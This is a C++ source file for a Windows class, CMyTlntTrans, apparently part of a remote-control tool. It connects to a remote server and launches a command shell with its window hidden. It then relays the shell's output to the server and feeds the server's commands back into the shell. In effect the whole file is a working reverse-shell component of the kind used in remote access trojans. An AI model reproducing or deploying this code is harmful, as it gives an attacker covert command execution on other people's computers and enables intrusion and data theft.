// MyTlntTrans.cpp: implementation of the CMyTlntTrans class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "PcCortr.h"
#include "MyTlntTrans.h"

#ifdef _DEBUG
#undef THIS_FILE
static char THIS_FILE[]=__FILE__;
#define new DEBUG_NEW
#endif

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CMyTlntTrans::CMyTlntTrans()
{
	hExitEvent = CreateEvent(NULL,TRUE,FALSE,NULL);
	hChildStdinRd = 0;
	hChildStdinWr = 0;
	hChildStdinWrDup = 0;
	hChildStdoutRd = 0;
	hChildStdoutWr = 0;
	hChildStdoutRdDup = 0;
	hSaveStdin = 0;
	hSaveStdout = 0;  
	hProcess = 0;
}

CMyTlntTrans::~CMyTlntTrans()
{
	//清理资源
	CloseHandle(hExitEvent);
}

//控制线程
BOOL CMyTlntTrans::StartWork(char* m_ServerAddr, int m_ServerPort, 
							  int nSend, int nRecv)
{
	//连接目标服务器,创建发送接收管道
	if(!CMyHttpPipeBase::StartWork(
		m_ServerAddr, m_ServerPort, nSend, nRecv)) 
		return FALSE;

	//启动命令接收线程
	_beginthread(TlntThread,0,this);

	//创建进程,重定向
	if(!CreateShellRedirect()) 
	{
		StopWork();
		return FALSE;
	}

	//开始接收数据
	DWORD dwBytesWritten = 0;
	while(WaitForSingleObject(hExitEvent,0) == WAIT_TIMEOUT) 
	{ 
		char chBuf[256] = {0};
		DWORD dwRead = 0;
		if( !ReadFile( hChildStdoutRdDup, chBuf, 
			128, &dwRead, NULL) || dwRead == 0) 
			break; 

		if(!SendData(chBuf, dwRead))
			break;
	} 

	CloseHandle( hChildStdinRd);
	CloseHandle( hChildStdoutWr);
	CloseHandle( hChildStdinWrDup);
	CloseHandle( hChildStdoutRdDup);
	StopWork();
	return TRUE;
}

void CMyTlntTrans::ProcessCmd()
{
	while(1)
	{
		//接收数据
		char ch = 0;
		if(!RecvData(&ch,1))
			break ;

		//发送命令到cmd
		DWORD dwWritten = 0;
		WriteFile(hChildStdinWrDup, &ch, 1, &dwWritten, NULL );
	}

	TerminateProcess(hProcess,0);

	//终止程序
	SetEvent(hExitEvent);
}

void CMyTlntTrans::TlntThread(LPVOID lPvoid)
{
	CMyTlntTrans* pThis = (CMyTlntTrans*) lPvoid;
	pThis->ProcessCmd();
}

//创建进程
BOOL CMyTlntTrans::CreateChildProcess()
{
	PROCESS_INFORMATION piProcInfo;
	STARTUPINFO siStartInfo;  
	ZeroMemory(&siStartInfo,sizeof(STARTUPINFO));
	siStartInfo.cb = sizeof(STARTUPINFO);
	siStartInfo.lpReserved = NULL;
	siStartInfo.lpReserved2 = NULL;
	siStartInfo.cbReserved2 = 0;
	siStartInfo.lpDesktop = NULL;
	siStartInfo.wShowWindow = SW_HIDE;
	siStartInfo.dwFlags = 0;
	siStartInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	siStartInfo.hStdInput = hChildStdinRd;
	siStartInfo.hStdOutput = hChildStdoutWr;
	siStartInfo.hStdError = hChildStdoutWr;
	siStartInfo.wShowWindow = SW_HIDE;

	TCHAR shellCmd[_MAX_PATH];
	if( !GetEnvironmentVariable(_T("ComSpec"), shellCmd, _MAX_PATH) )
		  return FALSE;
	_tcscat( shellCmd, _T(" /A") );
	BOOL ret = CreateProcess( NULL,
			shellCmd,       // applicatin name
			NULL,          // process security attributes 
			NULL,          // primary thread security attributes 
			TRUE,          // handles are inherited 
			CREATE_NO_WINDOW, // creation flags 
			NULL,          // use parent's environment 
			NULL,          // use parent's current directory 
			&siStartInfo,  // STARTUPINFO pointer 
			&piProcInfo);  // receives PROCESS_INFORMATION 
	if( ret )
		hProcess = piProcInfo.hProcess ;
	return ret;
}

BOOL CMyTlntTrans::CreateShellRedirect()
{
	SECURITY_ATTRIBUTES saAttr;
	BOOL fSuccess;

	// Set the bInheritHandle flag so pipe handles are inherited.
	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	saAttr.bInheritHandle = TRUE;
	saAttr.lpSecurityDescriptor = NULL;

	hSaveStdout = GetStdHandle(STD_OUTPUT_HANDLE);  
	
	if( !CreatePipe( &hChildStdoutRd, &hChildStdoutWr, &saAttr, 0) )
	{
		TRACE0( _T("Stdout pipe creation failed\n") );
		return FALSE;
	}

	if( !SetStdHandle(STD_OUTPUT_HANDLE, hChildStdoutWr) )
	{
		TRACE0( _T("Redirecting STDOUT failed\n") );
		return FALSE;
	}
   
    fSuccess = DuplicateHandle( GetCurrentProcess(), hChildStdoutRd,
        GetCurrentProcess(),  &hChildStdoutRdDup , 
		0,  FALSE,
        DUPLICATE_SAME_ACCESS );
	if( !fSuccess )
	{
		TRACE0( _T("DuplicateHandle failed\n") );
        return FALSE;
	}
	CloseHandle( hChildStdoutRd );
	
	// Save the handle to the current STDIN. 
	hSaveStdin = GetStdHandle(STD_INPUT_HANDLE);  

	// Create a pipe for the child process's STDIN.  
	if( !CreatePipe(&hChildStdinRd, &hChildStdinWr, &saAttr, 0) )
	{
		TRACE0( _T("Stdin pipe creation failed\n") );
		return FALSE;
	}
	// Set a read handle to the pipe to be STDIN.  
	if( !SetStdHandle(STD_INPUT_HANDLE, hChildStdinRd) ) 
	{
		TRACE0( _T("Redirecting Stdin failed\n") );
		return FALSE;
	}
	// Duplicate the write handle to the pipe so it is not inherited.  
	fSuccess = DuplicateHandle(GetCurrentProcess(), hChildStdinWr, 
		GetCurrentProcess(), &hChildStdinWrDup, 
		0, FALSE,                  // not inherited       
		DUPLICATE_SAME_ACCESS ); 
	if( !fSuccess ) 
	{
		TRACE0( _T("DuplicateHandle failed\n") );
		return FALSE;
	}
	CloseHandle(hChildStdinWr);  
	
	// Now create the child process. 
	if( !CreateChildProcess())
	{
		TRACE0( _T("CreateChildProcess failed\n") );
		return FALSE;
	}
	// After process creation, restore the saved STDIN and STDOUT.  
	if( !SetStdHandle(STD_INPUT_HANDLE, hSaveStdin) )
	{
		TRACE0( _T("Re-redirecting Stdin failed\n") );
		return FALSE;
	}
	if( !SetStdHandle(STD_OUTPUT_HANDLE, hSaveStdout) )
	{
		TRACE0( _T("Re-redirecting Stdout failed\n") );
		return FALSE;
	}
	return TRUE;
}